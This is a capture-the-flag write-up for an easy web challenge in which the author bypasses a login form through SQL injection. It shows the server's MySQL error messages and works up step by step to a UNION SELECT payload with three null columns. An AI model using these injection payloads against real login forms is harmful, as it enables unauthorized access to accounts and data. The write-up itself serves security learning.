# EZ CTF

## Web

### Super Secure

**Difficulty:** Easy

**Statement:** This is so unbreakable!

***

The challenge is to bypass authentication via an SQLi.

I start by testing short payloads to find an entry point.

I get an interesting error with a simple `'` :

```sql
Could not successfully run query (SELECT * FROM members WHERE username = ''' AND password = 'd41d8cd98f00b204e9800998ecf8427e') from DB: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'd41d8cd98f00b204e9800998ecf8427e'' at line 1
```

Thanks to the errors returned by the server, I can build my payload.

So I try to exploit the SQLi with a UNION query: `1' UNION SELECT null-- -`

```sql
Could not successfully run query (SELECT * FROM members WHERE username = '1' UNION SELECT null-- -' AND password = 'd41d8cd98f00b204e9800998ecf8427e') from DB: The used SELECT statements have a different number of columns
```

The error message returned informs us that there are several columns.

So I will adjust my payload to satisfy the number of columns by adding `null` values:

```sql
1' UNION SELECT null,null,null-- -
```

![image](https://user-images.githubusercontent.com/49941629/167300247-9600e52e-ba68-4b0c-8dfb-454aba2d522e.png)

Flag : EZ-CTF{N0t_S0_S4f3_4ft3r_411}
